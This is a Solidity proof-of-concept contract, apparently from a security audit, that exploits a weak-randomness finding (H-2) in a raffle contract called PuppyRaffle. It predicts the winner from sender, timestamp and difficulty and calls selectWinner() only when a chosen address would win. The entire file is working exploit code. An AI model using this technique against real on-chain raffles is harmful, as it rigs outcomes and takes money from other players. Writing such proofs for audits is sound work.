// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {PuppyRaffle} from "./PuppyRaffle.sol";

/// @notice Exploits H-2: Weak PRNG in selectWinner().
/// The winner index is computed from msg.sender, block.timestamp, and block.difficulty —
/// all values this contract knows before calling selectWinner().
/// Strategy: simulate the same hash off-chain, only call selectWinner() when target wins.
contract PRNGAttacker {
    PuppyRaffle public raffle;
    address public targetWinner;
    uint256 public playersCount;

    constructor(address _raffle, address _targetWinner, uint256 _playersCount) {
        raffle = PuppyRaffle(_raffle);
        targetWinner = _targetWinner;
        playersCount = _playersCount;
    }

    /// @notice Predicts who wins if this contract calls selectWinner right now.
    /// Since msg.sender in selectWinner will be address(this), we use address(this) in the hash.
    function predictWinner() public view returns (address predicted, uint256 winnerIndex) {
        winnerIndex =
            uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty)))
            % playersCount;
        predicted = raffle.players(winnerIndex);
    }

    /// @notice Only calls selectWinner if the target address is predicted to win.
    /// Reverts otherwise — attacker waits for a different block and tries again.
    function attackSelectWinner() external {
        (address predicted,) = predictWinner();
        require(predicted == targetWinner, "Target would not win this block - try again");
        raffle.selectWinner();
    }
}
